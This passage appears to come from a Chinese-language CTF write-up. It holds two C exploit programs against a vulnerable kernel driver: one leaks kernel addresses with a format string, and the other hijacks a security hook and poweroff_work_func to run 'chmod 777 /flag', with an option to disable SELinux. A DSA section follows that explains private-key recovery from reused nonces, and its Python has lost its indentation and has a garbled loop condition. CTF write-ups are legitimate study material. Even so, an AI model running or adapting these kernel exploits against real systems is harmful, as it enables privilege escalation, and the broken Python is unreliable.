    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define to_kmalloc 0x73311337
    #define to_kfree 0x13377331
    #define to_show 0xdeadbeef
    void exploit(){
        char buf[0x100] = {0};
        char test[] = "hello world!%lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx";
        memcpy(buf,test,sizeof(test));
        int fd1 = open("/dev/meizijiutql", O_RDWR);
        ioctl(fd1,to_kmalloc,0x500);
        write(fd1,buf,sizeof(buf));
        ioctl(fd1,to_show);
        ioctl(fd1,to_kfree);
    }
    int main(int argc, char const *argv[])
    {
        /* code */
        exploit();
        return 0;
    }
exp.c
    //exp.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define to_kmalloc 0x73311337
    #define to_kfree 0x13377331
    #define to_show 0xdeadbeef
    int main(int argc, char const *argv[])
    {
        unsigned long kernel_base;
        puts("input kernel addr:");
        scanf("%lu",&kernel_base);
        kernel_base -= 0x1c827f;
        unsigned long set_memory_rw = kernel_base + 0x54870;
        unsigned long selinux_disable = kernel_base + 0x31ebc0;
        unsigned long sbin_poweroff = kernel_base + 0x1241d40;
        unsigned long security_task_prctl = kernel_base + 0x3134e0;
        unsigned long hook_addr = kernel_base + 0x12934a8;
        unsigned long orderly_poweroff = kernel_base + 0x81b10;
        unsigned long poweroff_work_func = kernel_base + 0x82000;
        printf("kernel_base = %pn", kernel_base);
        printf("set_memory_rw = %pn", set_memory_rw);
        printf("selinux_disable = %pn", selinux_disable);
        printf("sbin_poweroff = %pn", sbin_poweroff);
        printf("security_task_prctl = %pn", security_task_prctl);
        printf("hook_addr = %pn", hook_addr);
        printf("orderly_poweroff = %pn", orderly_poweroff);
        printf("poweroff_work_func = %pn", poweroff_work_func);
        int fd1 = open("/dev/meizijiutql", O_RDWR);
        ioctl(fd1,to_kmalloc,0xc0);
        unsigned long fake[0x19] = {0};
        fake[0x18] = sbin_poweroff;
        write(fd1,(char *)fake,sizeof(fake));
        ioctl(fd1,to_kmalloc,0xc0);
        ioctl(fd1,to_kmalloc,0xc0);//get addr
        char cmd[] = "/bin/chmod 777 /flag";
        write(fd1,cmd,sizeof(cmd));
        ioctl(fd1,to_kmalloc,0x100);
        unsigned long fake2[0x21] = {0};
        fake2[0x20] = hook_addr;
        write(fd1,(char *)fake2,sizeof(fake2));
        ioctl(fd1,to_kmalloc,0x100);
        ioctl(fd1,to_kmalloc,0x100);//get addr
        unsigned long addr = sbin_poweroff;
        unsigned long fake_table[4] = {0};
        fake_table[3] = selinux_disable;
        unsigned long *p = &fake_table;
        write(fd1,&p,8);
        //prctl(addr,2,addr,addr,2);//do selinux_disable
        fake_table[3] = poweroff_work_func;
        prctl(addr,2,addr,addr,2);//do poweroff_work_func
        return 0;
    }
## Crypto
###  DSA
与题目所给地址进行交互，回显出DSA签名算法的参数p,q,g,y,并给出对12组语句MD5值的签名的结果(r,s)，求解私钥x。  
观察到所给的签名结果中，存在两组数据的r相同,说明这两组数据签名时采取了相同的随机数k，原理参考[https://www.jarviswang.me/?p=169，可以解除相应私钥x，之后用x加密所给的md5值提供给服务器就ok](https://www.jarviswang.me/?p=169%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%A7%A3%E9%99%A4%E7%9B%B8%E5%BA%94%E7%A7%81%E9%92%A5x%EF%BC%8C%E4%B9%8B%E5%90%8E%E7%94%A8x%E5%8A%A0%E5%AF%86%E6%89%80%E7%BB%99%E7%9A%84md5%E5%80%BC%E6%8F%90%E4%BE%9B%E7%BB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B0%B1ok).  
计算脚本如下：  
DSA.py
    from random import randrange
    from hashlib import sha1
    from gmpy2 import xmpz, to_binary, invert, powmod, is_prime
    def generate_p_q(L, N):
    g = N  # g >= 160
    n = (L - 1) // g
    b = (L - 1) % g
    while True:
    # generate q
    while True:
    s = xmpz(randrange(1, 2 ** (g)))
    a = sha1(to_binary(s)).hexdigest()
    zz = xmpz((s + 1) % (2 ** g))
    z = sha1(to_binary(zz)).hexdigest()
    U = int(a, 16) ^ int(z, 16)
    mask = 2 ** (N - 1) + 1
    q = U | mask
    if is_prime(q, 20):
    break
    # generate p
    i = 0  # counter
    j = 2  # offset
    while i = 2 ** (L - 1):
    if is_prime(p, 10):
    return p, q
    i += 1
    j += n + 1
    def generate_g(p, q):
    while True:
    h = randrange(2, p - 1)
    exp = xmpz((p - 1) // q)
    g = powmod(h, exp, p)
    if g > 1:
    break
    return g
    def generate_keys(g, p, q):
    x = randrange(2, q)  # x < q
    y = powmod(g, x, p)
    return x, y
    def generate_params(L, N):